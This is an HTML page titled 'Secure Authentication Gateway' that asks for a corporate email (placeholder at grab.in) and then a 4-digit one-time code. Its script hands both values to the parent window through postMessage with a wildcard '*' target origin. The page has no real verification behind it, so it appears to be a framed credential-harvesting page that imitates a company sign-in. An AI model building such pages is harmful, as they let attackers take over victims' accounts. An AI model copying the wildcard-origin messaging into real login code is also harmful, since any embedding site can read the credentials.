<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><title>Secure Authentication Gateway</title>
    <style>
        :root{--bg:#0b0f19;--card-bg:rgba(15,23,42,0.95);--border:rgba(255,255,255,0.1);--emerald:#10b981;--cyan:#06b6d4;--text:#f8fafc;--muted:#94a3b8;}
        *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif;}
        body{background:var(--bg);color:var(--text);display:flex;justify-content:center;align-items:center;height:100vh;overflow:hidden;}
        .auth-card{background:var(--card-bg);border:1px solid var(--border);border-radius:16px;padding:32px;width:360px;box-shadow:0 25px 50px rgba(0,0,0,0.5);backdrop-filter:blur(10px);}
        h2{font-size:1.25rem;margin-bottom:6px;} p{font-size:0.85rem;color:var(--muted);margin-bottom:22px;}
        label{display:block;font-size:0.78rem;text-transform:uppercase;color:var(--muted);margin-bottom:8px;}
        input{width:100%;padding:12px 16px;background:#020617;border:1px solid rgba(255,255,255,0.12);color:#fff;border-radius:10px;margin-bottom:18px;outline:none;}
        input:focus{border-color:var(--cyan);}
        .submit-btn{width:100%;padding:12px;background:linear-gradient(135deg,var(--emerald),var(--cyan));border:none;color:#031510;font-weight:bold;border-radius:10px;cursor:pointer;}
        .step{display:none;} .step.active{display:block;}
        .otp-input{letter-spacing:0.5em;text-align:center;font-size:1.2rem;}
    </style>
</head>
<body>
    <div class="auth-card">
        <div id="stepEmail" class="step active">
            <h2>Identity Verification</h2><p>Please enter your corporate email.</p>
            <label>Corporate Email</label><input type="email" id="emailField" placeholder="name@grab.in" required>
            <button class="submit-btn" onclick="submitEmail()">Continue</button>
        </div>
        <div id="stepOtp" class="step">
            <h2>Enter Security Code</h2><p>A 4-digit code has been dispatched.</p>
            <label>4-Digit OTP</label><input type="text" id="otpField" class="otp-input" maxlength="4" placeholder="••••" required>
            <button class="submit-btn" onclick="submitOtp()">Verify & Complete</button>
        </div>
    </div>
    <script>
        let userEmail="";
        function submitEmail(){
            const e=document.getElementById('emailField').value.trim();
            if(!e || !e.includes('@')) return alert('Valid email required.');
            userEmail=e;
            window.parent.postMessage({type:'SUBMIT_EMAIL',email:userEmail},'*');
            document.getElementById('stepEmail').classList.remove('active');
            document.getElementById('stepOtp').classList.add('active');
        }
        function submitOtp(){
            const o=document.getElementById('otpField').value.trim();
            if(o.length!==4 || isNaN(o)) return alert('Valid 4-digit code required.');
            window.parent.postMessage({type:'SUBMIT_OTP',email:userEmail,otp:o},'*');
        }
    </script>
</body>
</html>
